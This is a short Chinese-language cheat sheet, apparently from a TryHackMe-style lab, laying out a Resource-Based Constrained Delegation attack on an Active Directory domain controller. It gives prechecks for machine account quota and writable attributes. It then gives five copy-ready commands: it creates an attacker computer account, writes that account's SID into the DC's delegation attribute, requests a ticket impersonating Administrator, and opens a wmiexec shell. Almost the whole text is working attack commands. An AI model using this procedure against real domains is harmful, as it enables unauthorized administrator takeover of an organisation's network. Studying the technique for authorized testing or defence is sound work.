---
os: windows
syntax:
---
### 前置检查：
#### Machine account Quota:
```
(Get-ADDomain).MachineAccountQuota
```
	检查能否创建机器账户，0为不能
#### impacket-addcomputer：
```
impacket-addcomputer
```
	检查能否创建新机器账户，有的时候上面Get-ADDomain的不准确，需要实际测试
	能否写DC对象：
```
Get-ACL "AD:CN=K2ROOTDC,OU=Domain Controllers,DC=k2,DC=thm"
```
	测试是否有
- GenericWrite
    
- WriteDacl
    
- WriteOwner
    
- GenericAll
#### 能否写SPN：
	如果可写，用以下命令来为目标账户添加服务主体
```
Set-ADComputer -Add @{servicePrincipalName="CIFS/xxx"}
```
#### 能否写msDS-AllowedToActOnBehalfOfOtherIdentity：
	这是RBCD核心字段，如果可写：

```
Set-ADComputer -Replace @{msDS-AllowedToActOnBehalfOfOtherIdentity=$bytes}
```
### RBCD attack流程：
核心目的：伪造admin访问DC
#### Step1:创建机器账户
```
impacket-addcomputer \
  -method SAMR \
  -computer-name ATTACKERSYSTEM$ \
  -computer-pass Password00! \
  -dc-ip 10.10.10.10 \
  domain/user:pass
```
	如果成功了，ATTACKERSYSTEM$成为了委派的主体
#### Step2: 获取新机器的SID
```
(Get-ADComputer ATTACKERSYSTEM$).SID
```
#### Step3:写入RBCD主体
```
$sid = (Get-ADComputer ATTACKERSYSTEM$).SID.Value
$sd = New-Object Security.AccessControl.RawSecurityDescriptor("O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$sid)")
$bytes = New-Object byte[] ($sd.BinaryLength)
$sd.GetBinaryForm($bytes,0)

Set-ADComputer K2ROOTDC -Replace @{'msDS-AllowedToActOnBehalfOfOtherIdentity'=$bytes}
```
#### Step4: 请求服务票据
```
impacket-getST \
  -dc-ip 10.10.10.10 \
  domain/ATTACKERSYSTEM$:Password00! \
  -spn HOST/K2ROOTDC.domain.local \
  -impersonate Administrator
```
成功后会生成ccahe
#### Step5:利用票据登录
```
export KRB5CCNAME=Administrator.ccache

impacket-wmiexec -k -no-pass \
  domain/Administrator@K2ROOTDC.domain.local
```